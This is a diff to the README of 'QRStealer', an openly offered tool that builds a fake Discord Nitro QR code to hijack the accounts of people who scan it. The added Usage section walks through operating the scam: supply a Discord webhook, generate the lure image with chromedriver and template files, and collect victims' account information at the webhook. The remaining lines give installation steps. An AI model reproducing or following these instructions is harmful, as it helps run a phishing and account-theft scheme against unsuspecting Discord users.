@@ -26,6 +26,17 @@ A program that automatically generates a Nitro scam QR code and grabs the Discor
 <img src="https://i.imgur.com/tL1hFtJ.png" alt="png">
 </details>
   
+## Usage
+1. Open the program
+
+2. Enter your Discord webhook url
+
+3. After pressing enter, wait for the image to be generated. (Make sure there's chromedriver.exe, template.png and overlay.png in the same folder, you can find images [here](https://github.com/extatent/Discord-QR-Stealer/tree/main/QRStealer/images), and chromedriver [here](https://chromedriver.chromium.org/downloads). Make sure your chromedriver version matches your google chrome version)
+
+4. The image will be created with the final.png name in the same folder.
+  
+5. After someone gets the QR code and scans it with the Discord app, their info will be sent to your Discord webhook.
+  
 ## Installation 
 
 #### Compiled version
@@ -44,7 +55,7 @@ A program that automatically generates a Nitro scam QR code and grabs the Discor
   
 >Go to bin>debug folder and open the QRStealer.exe file.
 
->NOTE: Make sure you have [Visual Studio 2019 or Visual Studio 2022](https://visualstudio.microsoft.com/downloads/) and [.NET Framework 4.8](https://dotnet.microsoft.com/en-us/download/dotnet-framework) installed. Make sure your chromedriver version matches your google chrome version.
+>NOTE: Make sure you have [Visual Studio 2019 or Visual Studio 2022](https://visualstudio.microsoft.com/downloads/) and [.NET Framework 4.8](https://dotnet.microsoft.com/en-us/download/dotnet-framework) installed.
 
 ---
 ### QRStealer is licensed under the GNU General Public License v3.0. See the [LICENSE](https://github.com/extatent/QRStealer/blob/main/LICENSE) file for details.
